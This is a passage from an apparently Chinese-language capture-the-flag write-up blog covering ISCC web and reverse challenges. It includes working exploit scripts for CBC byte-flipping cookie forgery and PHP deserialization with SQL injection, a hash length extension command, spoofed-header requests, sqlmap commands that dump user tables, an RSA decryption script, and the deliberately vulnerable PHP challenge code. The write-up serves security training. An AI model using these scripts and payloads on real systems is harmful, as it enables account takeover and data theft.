class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s 78cfc57d983b4a17e55828c001a3e781 -d guest -k 46 -a admin</span><br><span class="line">得出</span><br><span class="line">5f585093a7fe86971766c3d25c43d0eb</span><br><span class="line">guets\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin</span><br><span class="line">处理</span><br><span class="line">guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin</span><br></pre></td></tr></table></figure><p>这个提交得看脸。</p><p>ISCC{MD5_1s_n0t_5afe}</p><h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p>查看源码发现提示<code>index.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;sqlwaf.php&apos;;</span><br><span class="line">define(&quot;SECRET_KEY&quot;, &quot;................&quot;);</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $iv;</span><br><span class="line">&#125;</span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv=get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is *************&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">  $username=waf((string)$_POST[&apos;username&apos;]);</span><br><span class="line">  $password=waf((string)$_POST[&apos;password&apos;]);</span><br><span class="line">  if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.rawidn.com/posts/CBC-Byte-Flipping-Attack.html" target="_blank" rel="noopener">CBC字节反转攻击</a>攻击题目，先将输入的账号密码序列化，也就是获取<code>$plain</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username = &apos;Admin&apos;;</span><br><span class="line">$password = &apos;RcoIl&apos;;</span><br><span class="line">$info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">$plain = serialize($info);</span><br><span class="line">echo $plain;</span><br><span class="line">?&gt;</span><br><span class="line">运算结果：</span><br><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;Admin&quot;;s:8:&quot;password&quot;;s:5:&quot;RcoIl&quot;;&#125;</span><br></pre></td></tr></table></figure><p>我们的目的就是将<code>Admin</code>中的<code>A</code>转换成<code>a</code>，接下来就是把明文分成16个字节的块（因为<code>AES-128</code>以128位为一块,正好16字节）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;userna</span><br><span class="line">me&quot;;s:5:&quot;Admin&quot;;</span><br><span class="line">s:8:&quot;password&quot;;s</span><br><span class="line">:5:&quot;RcoIl&quot;;&#125;</span><br></pre></td></tr></table></figure><p>我们目标字符位于块2，这意味这我们需要改变块1的密文来改变第二块的密文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#! -*- coding:utf-8 -*-</span><br><span class="line">__author__=&apos;RcoIl&apos;</span><br><span class="line">import base64 </span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">from urllib import unquote</span><br><span class="line"></span><br><span class="line">url = &apos;http://118.190.152.202:8001/&apos;</span><br><span class="line">data = &#123;</span><br><span class="line">    &apos;username&apos;: &apos;Admin&apos;,</span><br><span class="line">    &apos;password&apos;: &apos;12345&apos;,</span><br><span class="line">&#125;</span><br><span class="line">def Cookie(): </span><br><span class="line">    s = requests.Session()</span><br><span class="line">    cookies = s.post(url,data=data).cookies</span><br><span class="line">    cipher = base64.b64decode(unquote(cookies[&apos;cipher&apos;]))</span><br><span class="line">    cipher = cipher[:9] +  chr(ord(cipher[9]) ^ ord(&apos;A&apos;) ^ ord(&apos;a&apos;)) + cipher[10:]</span><br><span class="line">    Cookie = &quot;PHPSESSID=&quot;+urllib.unquote(cookies[&apos;PHPSESSID&apos;])+&apos;; &apos;+&quot;iv=&quot; + urllib.unquote(cookies[&apos;iv&apos;])+&apos;; &apos;+&quot;cipher=&quot; + urllib.quote(base64.b64encode(cipher))</span><br><span class="line"></span><br><span class="line">    header = &#123;</span><br><span class="line">        &quot;Cookie&quot;: Cookie</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        request = requests.post(url , headers = header)     </span><br><span class="line">    except Exception as e:</span><br><span class="line">        print e</span><br><span class="line">    else:</span><br><span class="line">        print request.text[18:][:-24]</span><br><span class="line">        print Cookie</span><br><span class="line">            </span><br><span class="line">Cookie()   </span><br><span class="line">运行结果：</span><br><span class="line">C/6oiLKm49k5g+Zw0sS8VW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9</span><br><span class="line">PHPSESSID=s3ikg88gets6adghmksalc2ld6; iv=w8wkcnN//ERbrLkywW37hA==; cipher=7dpnbYnc5gErczAwWeSYjWwDq8NfL83hd%2B0ZqcZMrZ/TA2i7QVfndD6GNQV/wDhzOW0x3vij5aEuOsEwuCIzGg%3D%3D</span><br><span class="line">查看unserialize的内容</span><br><span class="line">þ¨²¦ãÙ9æpÒÄ¼Ume&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;;&#125;,已成功改成admin</span><br></pre></td></tr></table></figure><p>但是第一块的内容显示不出来，接下来就是获取新的iv值及flag的获取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#! -*- coding:utf-8 -*-</span><br><span class="line">__author__=&apos;RcoIl&apos;</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://118.190.152.202:8001/&apos;</span><br><span class="line">iv = base64.b64decode(&quot;w8wkcnN//ERbrLkywW37hA==&quot;)</span><br><span class="line">plain = base64.b64decode(&quot;C/6oiLKm49k5g+Zw0sS8VW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9&quot;)</span><br><span class="line">want = &apos;a:2:&#123;s:8:&quot;userna&apos;</span><br><span class="line">newiv = &apos;&apos;</span><br><span class="line">for i in range(16):</span><br><span class="line">    newiv += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))</span><br><span class="line">iv = urllib.quote(base64.b64encode(newiv)) # qQi%2BwLqqJaVYDSoxdtspsA%3D%3D</span><br><span class="line">cookie = &quot;PHPSESSID=s3ikg88gets6adghmksalc2ld6; iv=&quot;+ iv +&quot;; cipher=7dpnbYnc5gErczAwWeSYjWwDq8NfL83hd%2B0ZqcZMrZ/TA2i7QVfndD6GNQV/wDhzOW0x3vij5aEuOsEwuCIzGg%3D%3D&quot;</span><br><span class="line">header = &#123;</span><br><span class="line">        &quot;Cookie&quot;: cookie</span><br><span class="line">    &#125;</span><br><span class="line">try:</span><br><span class="line">    request = requests.post(url , headers = header)     </span><br><span class="line">except Exception as e:</span><br><span class="line">    print e</span><br><span class="line">else:</span><br><span class="line">    print request.text</span><br></pre></td></tr></table></figure><p>替换提交即可登陆真正的<code>admin</code>用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;Hello admin&lt;/p&gt;&lt;p&gt;Flag is ISCC&#123;123dasd89as10aas&#125;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action=&quot;md5.php&quot;  method=&quot;post&quot; &gt; </span><br><span class="line">    用户名:&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt; </span><br><span class="line">    密码:&lt;input type=&quot;password&quot; name =&quot;password&quot;/&gt; </span><br><span class="line">    &lt;input type=&quot;submit&quot; &gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;); </span><br><span class="line">if(isset($_POST[&apos;username&apos;])&amp;isset($_POST[&apos;password&apos;]))&#123; </span><br><span class="line">    $username = $_POST[&apos;username&apos;]; </span><br><span class="line">    $password = $_POST[&apos;password&apos;]; </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    $username=&quot;hello&quot;; </span><br><span class="line">    $password=&quot;hello&quot;; </span><br><span class="line">&#125; </span><br><span class="line">if(md5($password) == 0)&#123; </span><br><span class="line">    echo &quot;xxxxx&quot;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看到第19行，明显的弱类型绕过。密码填写<code>240610708</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &apos;flag.php&apos;; </span><br><span class="line">$a = @$_REQUEST[&apos;a&apos;]; </span><br><span class="line">@eval(&quot;var_dump($$a);&quot;); </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>绕过即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">no_md5.php?a=flag</span><br><span class="line">ISCC&#123;a39f9a1ff7eb4bab8a6a21b2ce111b4&#125;</span><br></pre></td></tr></table></figure><h3 id="Only-Admin"><a href="#Only-Admin" class="headerlink" title="Only Admin"></a>Only Admin</h3><p>题目：听说只有admin可以看到flag？</p><p>最开始以为是利用MySQL的超长截断特性进行注册登陆，发现没成功。</p><p>扫描目录，发现有一个<a href="https://pan.baidu.com/s/1w0TI7ghbq0pwtLAs8w60ig" target="_blank" rel="noopener">web.zip</a>文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">web</span><br><span class="line">├─ .vscode</span><br><span class="line">│    └─ launch.json</span><br><span class="line">├─ MessageController.class.php</span><br><span class="line">├─ UserController.class.php</span><br><span class="line">├─ config.php  # 配置文件</span><br><span class="line">├─ index.php  # 登陆后主页</span><br><span class="line">├─ login.php  # 登陆页面</span><br><span class="line">├─ reg.php  # 注册页面</span><br><span class="line">├─ send.php</span><br><span class="line">└─ show.php</span><br></pre></td></tr></table></figure><p>审计，难受。 其实也就是带<code>cookie</code>访问的问题。</p><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url=&quot;http://118.190.152.202:8020/&quot;</span><br><span class="line">def attack(url, payload):</span><br><span class="line">    s=requests.session()</span><br><span class="line">    u1 = url + &quot;send.php&quot;</span><br><span class="line">    plen = len(payload)</span><br><span class="line">    payload = &apos;a:2:&#123;s:5:&quot;email&quot;;O:7:&quot;Message&quot;:4:&#123;s:3:&quot;msg&quot;;s:&apos;+str(plen)+&apos;:&quot;&apos;+payload+&apos;&quot;;s:4:&quot;from&quot;;N;s:2:&quot;to&quot;;N;s:2:&quot;id&quot;;i:-1;&#125;s:8:&quot;password&quot;;s:5:&quot;23333&quot;;&#125;&apos;</span><br><span class="line">    cookies = &#123;&apos;ckSavePass&apos;: base64.b64encode(payload)&#125;</span><br><span class="line">    r = s.get(u1, cookies=cookies)</span><br><span class="line">    u2=&quot;http://118.190.152.202:8020/&quot; +&apos;config.php&apos;</span><br><span class="line">    r2=s.get(u2)</span><br><span class="line">    print r2.headers[&apos;Set-Cookie&apos;]</span><br><span class="line">    return False</span><br><span class="line">payload=&quot;111&apos; || 1=1 -- 111&quot;</span><br><span class="line">attack(url,payload)</span><br><span class="line">运行结果：</span><br><span class="line">csrftoken=zy129p1yvx; expires=Sun, 13-May-2018 15:47:38 GMT; Max-Age=3600; path=/, flag=flag&#123;USer1ali2e1sInt4rt1n9&#125;; expires=Sun, 13-May-2018 15:47:38 GMT; Max-Age=3600; path=/; httponly</span><br></pre></td></tr></table></figure><h3 id="为什么这么简单啊"><a href="#为什么这么简单啊" class="headerlink" title="为什么这么简单啊"></a>为什么这么简单啊</h3><p>进入，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一关</span><br><span class="line"></span><br><span class="line">第二关需要从 http://edu.xss.tv 进入，并且只有我公司的IP地址才可以进入第二关，公司IP为：110.110.110.110</span><br></pre></td></tr></table></figure><p>伪造IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 118.190.152.202:8016</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: PHPSESSID=b604vp88ds9coh4352d3dncih2</span><br><span class="line">X-Forwarded-For: 110.110.110.110</span><br><span class="line">Referer: http://edu.xss.tv</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>进入到第二关，寻找密码。右键源码看到<code>password.js</code>，解密其中的base64，得到密码<code>xinyiji.com</code></p><p>flag：B1H3n5u0xI2n9JIscc</p><h3 id="Sqli"><a href="#Sqli" class="headerlink" title="Sqli"></a>Sqli</h3><p>在<code>username</code>存在延迟注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r post.txt --level 3 --tamper=space2comment --time-sec 6 -D &quot;sqli_database&quot; -T &quot;user&quot; -C &quot;username,pass&quot; --dump </span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: username=%E2%80%98&apos; AND (SELECT * FROM (SELECT(SLEEP(5)))fbFG) AND &apos;xEit&apos;=&apos;xEit&amp;password=&apos;</span><br><span class="line">---</span><br><span class="line">[15:04:25] [WARNING] changes made by tampering scripts are not included in shown payload content(s)</span><br><span class="line">[15:04:25] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: Apache 2.4.7, PHP 5.5.9</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">运行结果：</span><br><span class="line">Database: sqli_database</span><br><span class="line">Table: user</span><br><span class="line">[2 entries]</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| username | pass                             |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| test     | 098f6bcd4621d373cade4e832627b4f6 |（test）</span><br><span class="line">| admin    | 197ed45182778e1c74cc8c72f9fffc07 |（u4g009）</span><br><span class="line">+----------+----------------------------------+</span><br></pre></td></tr></table></figure><p>登陆发现提示<code>flag在另一个字段</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r post.txt --level 3 --tamper=space2comment --time-sec 6 -D &quot;sqli_database&quot; -T &quot;news&quot; -C &quot;kjafuibafuohnuvwnruniguankacbh&quot; --dump</span><br><span class="line">运行结果：</span><br><span class="line">Database: sqli_database</span><br><span class="line">Table: news</span><br><span class="line">[1 entry]</span><br><span class="line">+--------------------------------+</span><br><span class="line">| kjafuibafuohnuvwnruniguankacbh |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| flag&#123;hahaha999999999&#125;          |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure><h3 id="有种你来绕"><a href="#有种你来绕" class="headerlink" title="有种你来绕"></a>有种你来绕</h3><p>题目：我都过滤了，看你怎么绕。记住是mysql</p><p>只给了一个登录框，然后没了，那么尝试了一下admin, admin提示密码错误，再尝试了下其他的用户名密码，提示用户名错误，确定用户名就是admin</p><p>注入，过滤了<code>空格、#、*、union、like、regexp、and、or、|、–、&amp;、%0a、%0b、%0c、%0d</code>等，需要想办法用其他操作符连接注入语句和闭合’。</p><p>原文操作：<a href="https://blog.l1n3.net/writeup/swpu_ctf_2016_writeup/" target="_blank" rel="noopener">https://blog.l1n3.net/writeup/swpu_ctf_2016_writeup/</a></p><p>得出密码为<code>0416af0a8accf2be556a8e131438b814(nishishabi1438)</code></p><p>登陆之后和原题不一样了，直接填写<code>flag</code>就出现了flag值。</p><p>flag{sql_iNjEct_Is_Easy}</p><h2 id="0x03-Reverse"><a href="#0x03-Reverse" class="headerlink" title="0x03 Reverse"></a>0x03 Reverse</h2><h3 id="RSA256"><a href="#RSA256" class="headerlink" title="RSA256"></a>RSA256</h3><p>三个加密文件一个公钥。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">def ModExp(n, k, m):</span><br><span class="line">    a = list(bin(k))[2:]</span><br><span class="line">    a.reverse()</span><br><span class="line">    s = 1</span><br><span class="line">    for i in a:</span><br><span class="line">        if i == &apos;1&apos;:</span><br><span class="line">            s = (s * n) % m</span><br><span class="line">        n = (n * n) % m</span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line">n = int(&apos;D99E952296A6D960DFC2504ABA545B9442D60A7B9E930AFF451C78EC55D555EB&apos;, 16)</span><br><span class="line">print(&apos;n is&apos;)</span><br><span class="line">print(n)</span><br><span class="line">p = gmpy2.mpz(302825536744096741518546212761194311477)</span><br><span class="line">q = gmpy2.mpz(325045504186436346209877301320131277983)</span><br><span class="line">e = gmpy2.mpz(65537)</span><br><span class="line">phi_n = (p - 1) * (q - 1)</span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line">print(&quot;d is:&quot;)</span><br><span class="line">print(d)</span><br><span class="line">p = 302825536744096741518546212761194311477</span><br><span class="line">q = 325045504186436346209877301320131277983</span><br><span class="line">def ByteToHex( bins ):</span><br><span class="line">    return &apos;&apos;.join( [ &quot;%02X&quot; % x for x in bins ] ).strip()</span><br><span class="line"></span><br><span class="line">file1 = open(&quot;C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message1&quot;, &apos;rb&apos;).read()</span><br><span class="line">c1 = int(ByteToHex(file1), 16)</span><br><span class="line">print(&quot;c1&quot;, c1)</span><br><span class="line">file2 = open(&quot;C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message2&quot;, &apos;rb&apos;).read()</span><br><span class="line">c2 = int(ByteToHex(file2), 16)</span><br><span class="line">file3 = open(&quot;C:\\Users\\RcoIl\\Desktop\\fujian\\encrypted.message3&quot;, &apos;rb&apos;).read()</span><br><span class="line">c3 = int(ByteToHex(file3), 16)</span><br><span class="line">m = p * q</span><br><span class="line">flag1 = ModExp(c1, d, m)</span><br><span class="line">flag2 = ModExp(c2, d, m)</span><br><span class="line">flag3 = ModExp(c3, d, m)</span><br><span class="line">flag = &apos;0&apos; + hex(flag1)[2:] + &apos;0&apos; + hex(flag2)[2:] + &apos;0&apos; + hex(flag3)[2:]</span><br><span class="line">print(flag)</span><br><span class="line">i = 0</span><br><span class="line">result = &apos;&apos;</span><br><span class="line">for i in range(0, len(flag), 